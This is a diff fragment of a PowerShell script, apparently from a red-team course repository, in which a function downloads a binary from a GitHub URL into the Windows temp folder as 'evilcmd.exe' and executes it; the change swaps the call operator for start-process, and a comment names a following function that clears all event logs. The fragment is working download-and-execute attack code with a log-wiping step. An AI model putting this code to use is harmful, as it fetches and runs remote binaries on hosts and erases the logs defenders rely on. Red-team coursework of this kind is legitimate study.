@@ -347,7 +347,7 @@ Function Download-ExecuteBinary
 	invoke-webrequest -uri "https://github.com/robertriskin/csc842/blob/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/cmd.exe?raw=true" -outfile "c:\windows\temp\evilcmd.exe"
 	
 	#executes the downloaded cmd.exe
-	& "c:\windows\temp\evilcmd.exe"
+	start-process "c:\windows\temp\evilcmd.exe"
 }
 
 #Function that clears all event logs
